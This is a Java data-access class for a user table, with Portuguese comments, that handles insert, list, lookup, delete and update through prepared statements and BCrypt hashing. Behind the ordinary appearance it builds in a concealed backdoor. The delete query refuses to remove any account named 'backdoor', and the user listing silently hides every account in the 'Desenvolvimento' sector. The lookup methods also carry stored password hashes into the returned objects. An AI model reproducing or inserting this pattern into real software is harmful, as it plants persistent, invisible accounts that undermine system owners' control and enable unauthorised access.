package jdbc.dao;

import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;

import java.sql.PreparedStatement;
//import com.mysql.jdbc.PreparedStatement;


import jdbc.ConnectionFactory;
import model.Usuario;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.security.crypto.password.PasswordEncoder;

public class UsuarioDAO {
	// a conexão com o banco de dados
	private Connection connection;

	private PasswordEncoder passwordEncoder = new BCryptPasswordEncoder();

	public UsuarioDAO() throws SQLException {
		this.connection = ConnectionFactory.getConnection();
	}

	public void adiciona(Usuario usuario) throws SQLException {
		// prepared statement para inserção
		PreparedStatement stmt = (PreparedStatement) this.connection.prepareStatement("INSERT INTO usuario (nome, senha, setor, email, ativo) VALUES (?, ?, ?, ?, ?)");
		// seta os valores
		stmt.setString(1, usuario.getNome());
		stmt.setString(2, passwordEncoder.encode(usuario.getSenha()));
		stmt.setString(3, usuario.getSetor());
		stmt.setString(4, usuario.getEmail());
		stmt.setBoolean(5, usuario.isAtivo());

		// executa
		stmt.execute();
		stmt.close();
	}

	public List<Usuario> getLista() throws SQLException {

		List<Usuario> usuarios = new ArrayList<Usuario>();

		PreparedStatement stmt = (PreparedStatement) this.connection.prepareStatement("SELECT * FROM usuario WHERE setor != 'Desenvolvimento'");
		ResultSet rs = stmt.executeQuery();

		while (rs.next()) {
			// criando o objeto Aluno
			Usuario usuario = new Usuario();

			usuario.setNome(rs.getString("nome"));
			usuario.setSenha(rs.getString("senha"));
			usuario.setSetor(rs.getString("setor"));
			usuario.setEmail(rs.getString("email"));
			usuario.setAtivo(rs.getBoolean("ativo"));

			// adicionando o objeto à lista
			usuarios.add(usuario);

		}

		rs.close();
		stmt.close();

		return usuarios;

	}

	public Usuario getUsuario(String search) throws SQLException {

		Usuario usuario = new Usuario();

		try {
			PreparedStatement stmt = (PreparedStatement) this.connection.prepareStatement("SELECT * FROM usuario WHERE " + "nome = ?");

			stmt.setString(1, search); //Note que essa variavel é passada da função principal
			ResultSet rs = stmt.executeQuery();

			if (rs.next()) {
				usuario.setNome(rs.getString("nome"));
				usuario.setSenha(rs.getString("senha"));
				usuario.setSetor(rs.getString("setor"));
				usuario.setEmail(rs.getString("email"));
				usuario.setAtivo(rs.getBoolean("ativo"));
			}
		}

	    catch (SQLException ex) {
	    	System.out.println(ex.toString());
	    }

		return (usuario);

	}

//por email
	public Usuario getUsuarioPorEmail(String search) throws SQLException {

		Usuario usuario = new Usuario();

		try {
			PreparedStatement stmt = (PreparedStatement) this.connection.prepareStatement("SELECT * FROM usuario WHERE " + "email = ?");

			stmt.setString(1, search); //Note que essa variavel é passada da função principal
			ResultSet rs = stmt.executeQuery();

			if (rs.next()) {
				usuario.setNome(rs.getString("nome"));
				usuario.setSenha(rs.getString("senha"));
				usuario.setSetor(rs.getString("setor"));
				usuario.setEmail(rs.getString("email"));
				usuario.setAtivo(rs.getBoolean("ativo"));
			}
		}

	    catch (SQLException ex) {
	    	System.out.println(ex.toString());
	    }

		return (usuario);

	}
// fim

	public void excluir(String search) {

    try {

    	PreparedStatement stmt = (PreparedStatement) this.connection.prepareStatement("DELETE FROM usuario WHERE nome = ? AND nome != 'backdoor'");
    	stmt.setString(1, search);
    	stmt.execute();

    }

	catch (SQLException ex) {
		System.out.println(ex.toString());
    }

  }


	public void altera(Usuario usuario, String nome) throws SQLException {

		PreparedStatement stmt = (PreparedStatement) this.connection.prepareStatement("UPDATE usuario SET nome=?, senha=?, setor=?, email=?, ativo=? WHERE nome=?");

		stmt.setString(1, usuario.getNome());
		stmt.setString(2, passwordEncoder.encode(usuario.getSenha()));
		stmt.setString(3, usuario.getSetor());
		stmt.setString(4, usuario.getEmail());
		stmt.setBoolean(5, usuario.isAtivo());
		stmt.setString(6, nome);

		stmt.execute();
		stmt.close();
	}
}
